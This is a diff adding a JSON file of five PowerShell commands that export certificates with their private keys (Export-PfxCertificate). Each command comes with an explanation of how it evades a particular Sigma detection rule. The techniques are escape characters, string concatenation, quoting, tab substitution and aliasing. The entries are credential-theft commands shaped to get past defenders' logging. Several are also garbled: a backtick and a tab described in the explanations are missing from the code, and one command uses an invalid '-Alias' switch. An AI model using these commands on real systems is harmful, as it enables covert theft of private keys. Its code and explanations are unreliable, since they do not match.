@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"& Export-PfxCertificate -Cert $cert -FilePath C:\\\\temp\\\\cert.pfx\\\"",
+    "explanation": "The Sigma rule relies on an exact literal string match for 'Export-PfxCertificate '. Inserting a backtick (), which acts as PowerShell's escape character, breaks the static string match in process creation logs (Event ID 4688/1), but PowerShell resolves and executes the cmdlet normally."
+  },
+  {
+    "output": "powershell.exe -Command \"$cmd = 'Export-' + 'PfxCertificate'; & $cmd -Cert $cert -FilePath C:\\temp\\cert.pfx\"",
+    "explanation": "Dynamically constructing the cmdlet name using string variables and concatenation ensures the complete string 'Export-PfxCertificate' never appears in the initial process command-line arguments, bypassing the rule's selection criteria."
+  },
+  {
+    "output": "powershell.exe -Command \"& 'Export-PfxCertificate' -Cert $cert -FilePath C:\\temp\\cert.pfx\"",
+    "explanation": "The Sigma rule explicitly checks for the cmdlet name followed immediately by a space (e.g., 'Export-PfxCertificate '). By wrapping the cmdlet in single or double quotes and using the call operator (&), the exact string sequence is broken in the logs."
+  },
+  {
+    "output": "powershell.exe -Command \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\\\temp\\\\cert.pfx\\\"",
+    "explanation": "Because the Sigma rule looks for a trailing space character (' '), replacing the space between the cmdlet and its parameters with a horizontal tab character (t) will bypass the filter while remaining syntactically valid in PowerShell."
+  },
+  {
+    "output": "powershell.exe -Alias epfx Export-PfxCertificate; epfx -Cert Cert:\\LocalMachine\\My\\<Thumbprint> -FilePath C:\temp\\cert.pfx",
+    "explanation": "Creating a temporary alias for the cmdlet allows the attacker to execute the export functionality using a different name. Since the Sigma rule looks for the literal string 'Export-PfxCertificate ', the alias 'epfx' will not be caught."
+  }
+]
